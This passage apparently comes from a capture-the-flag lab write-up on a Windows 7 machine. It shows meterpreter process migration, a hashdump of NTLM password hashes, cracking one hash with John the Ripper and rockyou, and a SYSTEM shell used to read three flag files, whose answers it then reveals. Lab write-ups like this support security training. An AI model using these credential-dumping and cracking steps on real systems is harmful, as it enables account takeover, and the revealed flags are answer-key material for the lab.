        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:220:in `send_packet_wait_response'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:176:in `send_request'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:368:in `close'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:341:in `block in finalize'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `split'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:50:in `block in init_x8664_only'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `delete_if'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:44:in `init_x8664_only'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/x86_64/opcodes.rb:71:in `init_sse3'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1102:in `init_ssse3'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1107:in `init_sse41'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1112:in `init_sse42'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1117:in `init_avx'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1122:in `init_avx2'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/opcodes.rb:1128:in `init_all'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/cpu/ia32/main.rb:236:in `init_opcode_list'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:28:in `opcode_list'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/main.rb:42:in `opcode_list_byname'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:71:in `parse_instruction_mnemonic'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:31:in `parse_instruction'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/parse.rb:339:in `parse'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/shellcode.rb:69:in `assemble'
        from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/metasm-1.0.5/metasm/exe_format/main.rb:94:in `assemble'
        from /usr/share/metasploit-framework/lib/msf/core/payload/windows/x64/migrate_common_x64.rb:40:in `generate'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:824:in `generate_migrate_stub'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:628:in `migrate'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb:1254:in `cmd_migrate'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:102:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:64:in `block in interact'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:163:in `run'
        from /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console.rb:62:in `interact'
        from /usr/share/metasploit-framework/lib/msf/base/sessions/meterpreter.rb:565:in `_interact'
        from /usr/share/metasploit-framework/lib/rex/ui/interactive.rb:53:in `interact'
        from /usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1681:in `cmd_sessions'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:581:in `run_command'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:530:in `block in run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `each'
        from /usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:524:in `run_single'
        from /usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:168:in `run'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
        from /usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
        from /usr/bin/msfconsole:23:in `<main>'
[*] Migration completed successfully.
```

Now we have migrated we can begin further enumeration by running hashdump

```shell
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
As we have the full hash of the user Jon we can use John The Ripper to crack the hash:

```shell
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt  password.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (aad3b435b51404eeaad3b435b51404ee)     
1g 0:00:00:00 DONE (2023-05-09 12:09) 2.439g/s 24878Kp/s 24878Kc/s 24878KC/s alr19882006..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

Additionally as we have an upgraded shell to the machine we can open a shell and begin enumeration for flags

```shell
meterpreter > shell
Process 2108 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ..
cd ..

C:\Windows>cd..
cd..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
07/13/2009  10:20 PM    <DIR>          PerfLogs
04/12/2011  03:28 AM    <DIR>          Program Files
03/17/2019  05:28 PM    <DIR>          Program Files (x86)
12/12/2018  10:13 PM    <DIR>          Users
03/17/2019  05:36 PM    <DIR>          Windows
               1 File(s)             24 bytes
               5 Dir(s)  20,397,883,392 bytes free

C:\>type flag1.txt
type flag1.txt
flag{******************}
```

```shell
C:\Windows\System32\config>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\System32\config

05/09/2023  04:59 AM    <DIR>          .
05/09/2023  04:59 AM    <DIR>          ..
12/12/2018  06:00 PM            28,672 BCD-Template
05/09/2023  05:08 AM        18,087,936 COMPONENTS
05/09/2023  06:14 AM           262,144 DEFAULT
03/17/2019  02:32 PM                34 flag2.txt
07/13/2009  09:34 PM    <DIR>          Journal
05/09/2023  05:28 AM    <DIR>          RegBack
03/17/2019  03:05 PM           262,144 SAM
05/09/2023  05:09 AM           262,144 SECURITY
05/09/2023  06:15 AM        40,632,320 SOFTWARE
05/09/2023  06:26 AM        12,582,912 SYSTEM
11/20/2010  09:41 PM    <DIR>          systemprofile
12/12/2018  06:03 PM    <DIR>          TxR
               8 File(s)     72,118,306 bytes
               6 Dir(s)  20,397,883,392 bytes free

C:\Windows\System32\config>type flag2.txt
type flag2.txt
flag{****************************}
```

```shell
c:\Users\Jon\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of c:\Users\Jon\Documents

12/12/2018  10:49 PM    <DIR>          .
12/12/2018  10:49 PM    <DIR>          ..
03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes
               2 Dir(s)  20,397,883,392 bytes free

c:\Users\Jon\Documents>type flag3.txt
type flag3.txt
flag{*******************************}
```

---

# Trophy & Loot

flag1.txt
```bash
flag{access_the_machine}
```

flag2.txt

```shell
flag{sam_database_elevated_access}
```
flag3.txt

```bash
flag{admin_documents_can_be_valuable}
```
